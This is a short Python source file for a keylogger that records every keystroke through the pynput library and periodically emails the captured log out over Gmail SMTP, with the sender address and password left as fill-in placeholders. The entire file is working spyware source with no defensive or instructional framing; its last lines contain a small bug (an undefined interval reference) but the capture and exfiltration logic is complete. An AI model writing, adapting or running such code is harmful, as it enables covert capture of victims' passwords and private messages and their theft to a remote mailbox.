import pynput.keyboard
import threading
import requests
import smtplib

class KeyLogger:
	def __init__(self, time_interval, email, password):
		self.log = ''
		self.interval = time_interval
		self.mail = email
		self.passwd = password

	def append_string(self, string):
		self.log = self.log + string

	def prc_key_press(self, key):
		try:
			self.append_string(str(key.char))
		except AttributeError:
			if str(key) == 'Key.enter':
				self.log = self.log + "\n"
			elif str(key) == 'Key.space':
				self.log = self.log + " "
			else:
				self.log = self.log + " " + str(key) + " "

	def sendmail(self,email, password, message):
	    server = smtplib.SMTP("smtp.gmail.com", 587)
	    server.starttls()
	    server.login(email, password)
	    server.sendmail(email, email, message)
	    server.quit()

	def report(self):
		if len(self.log) == 0:
			pass
		else:
			self.sendmail(self.mail, self.passwd, f"\n\n {self.log}")
		self.log = ""
		timer = threading.Timer(self.interval, self.report)
		timer.start()

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.prc_key_press)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()

keyinst = KeyLogger(self.interval, 'YOURMAILHERE', 'YOURPASSHERE')
keyinst.start()